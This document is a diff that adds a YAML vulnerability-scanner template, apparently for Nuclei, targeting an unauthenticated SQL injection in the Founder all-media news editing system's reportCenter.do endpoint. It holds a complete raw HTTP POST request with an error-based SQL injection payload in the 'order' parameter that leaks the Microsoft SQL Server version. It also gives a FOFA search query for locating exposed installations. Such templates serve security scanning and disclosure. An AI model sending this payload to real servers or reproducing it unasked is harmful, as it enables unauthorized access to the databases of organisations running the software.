@@ -1,0 +1,38 @@
+id: founder-reportCenter-sqli
+info:
+  name: 方正畅享全媒体新闻采编系统 reportCenter.do - sqli
+  author: leadlife
+  severity: high
+  description: 方正畅享全媒体新闻采编系统reportCenter.do存在SQL注入漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93/%E6%96%B9%E6%AD%A3%E7%95%85%E4%BA%AB%E5%85%A8%E5%AA%92%E4%BD%93%E6%96%B0%E9%97%BB%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9FreportCenter.do%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="FOUNDER-全媒体采编系统"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,sqli,founder
+
+http:
+  - raw:
+      - |
+        POST /newsedit/report/reportCenter.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(@@version as int)=5-- a
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','Microsoft SQL Server','nvarchar')
+        condition: and
